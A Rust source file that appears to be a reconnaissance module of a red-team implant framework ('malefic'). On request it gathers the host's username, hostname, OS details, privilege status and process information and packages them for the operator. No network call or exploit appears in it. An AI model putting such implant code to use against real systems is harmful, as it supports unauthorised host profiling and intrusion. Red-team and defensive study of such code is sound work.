use crate::prelude::*;

pub struct SysInfo {}
#[async_trait]
#[module_impl("sysinfo")]
impl Module for SysInfo {}

#[async_trait]
impl malefic_proto::module::ModuleImpl for SysInfo {
    async fn run(&mut self, id: u32, receiver: &mut malefic_proto::module::Input, _: &mut malefic_proto::module::Output) -> malefic_proto::module::ModuleResult {
        let _ = check_request!(receiver, Body::Request)?;
        let info = malefic_helper::common::sysinfo::get_sysinfo();
        let os = info.os.unwrap();
        let process = info.process.unwrap();
        
        
        Ok(TaskResult::new_with_body(id, Body::Sysinfo(malefic_proto::proto::modulepb::SysInfo {
            filepath: info.filepath,
            workdir: info.workdir,
            is_privilege: info.is_privilege,
            os: Some(malefic_proto::proto::modulepb::Os{
                name: os.name,
                version: os.version,
                release: os.release,
                arch: os.arch,
                username: os.username,
                hostname: os.hostname,
                locale: os.locale,
            }),
            process: Some(malefic_proto::proto::modulepb::Process {
                name: process.name,
                pid: process.pid,
                ppid: process.ppid,
                arch: process.arch,
                owner: process.owner,
                path: process.path,
                args: process.args,
                uid: "".to_string(),
            })
        })))
    }
}